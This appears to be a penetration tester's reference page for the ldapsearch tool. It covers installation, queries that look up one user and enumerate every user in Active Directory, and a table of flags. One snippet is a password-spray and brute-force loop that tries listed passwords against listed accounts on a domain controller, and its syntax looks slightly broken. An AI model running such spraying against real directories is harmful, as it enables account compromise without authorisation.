---
tags:
  - tool
category: active-directory
---
## Description

Used to query and search data on an LDAP server or Active Directory.

## Installation

```bash
sudo apt-get install ldap-utils
```

## Common Usage

*Find the user jdoe*
```bash
ldapsearch -x -H ldap://dc.example.com -D "user@example.com" -w 'Password123!' -b "dc=example,dc=com" "(sAMAccountName=jdoe)"
```

*Get every user and output only the SAM Account Name*
```bash
ldapsearch -x -H ldap://dc.example.com -D "user@example.com" -w 'Password123!' -b "dc=example,dc=com" "(&(objectCategory=person)(objectClass=user))" sAMAccountName
```

*Password Spray/Brute Force*
```bash
for password in $(cat passwords.list); do for user $(cat users.list); do echo $user:$password; ldapsearch -x -H ldap://dc.example.com -D $user@example.com -w $password -b "dc=example,dc=com" "(sAMAccountName=$user)"; done; done | tee -a password_spray_out.txt | grep --no-group-separator -B1 "extended LDIF" password_spray | grep -v "extended LDIF"
```

## Flags Reference

| Flag       | Description                                                                    |
| ---------- | ------------------------------------------------------------------------------ |
| -x         | Use simple auth instead of SASL                                                |
| -H         | Specifies the Domain Controller URL - LDAP for unencrypted LDAPS for encrypted |
| -D         | The user that is authorized to read AD                                         |
| -w/-W      | Lower case: put the password in the command, uppercase: prompt for password    |
| -b         | The search base to start at                                                    |
| Positional | Search query                                                                   |
| Positional | Output control                                                                 |

## Example Output

```
```

## Notes / Gotchas

> [!INFO] Change the LDAP URL to LDAPS or LDAP depending on the environment

## Related

<!-- Links to other Tool Box pages or Knowledge Base pages this pairs with -->
